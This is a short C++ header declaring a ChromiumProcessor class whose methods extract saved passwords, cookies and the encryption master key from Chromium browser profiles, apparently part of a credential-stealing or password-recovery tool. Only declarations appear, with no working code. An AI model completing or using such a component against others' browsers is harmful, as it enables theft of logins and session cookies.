#ifndef CHROMIUM_PROCESSOR_HPP
#define CHROMIUM_PROCESSOR_HPP

#include <experimental/filesystem>
#include <openssl/aes.h>
#include <sstream>
#include <string.h>
#include <iostream>
#include "tools.hpp"
#include "cookie.hpp"

using namespace std;

class ChromiumProcessor
{
    public:
    ChromiumProcessor();
    ~ChromiumProcessor();

    vector <Cookie> *Cookies;

    string userdata_path;
    string pass_path;
    string cookies_path;
    string prevBrowser_path;

    int ExtractChromiumPasswords();
    int ExtractChromiumCookies();
    unsigned char *ExtractChromiumMasterKey();

private:
    unsigned char *MasterKey;
    sqlite3 *ChromiumDB;
};

#if defined(__WIN64__)
    #include <tchar.h>
#elif defined(__linux__)
    //linux headers here
#endif

#endif //CHROMIUM_PROCESSOR_HPP
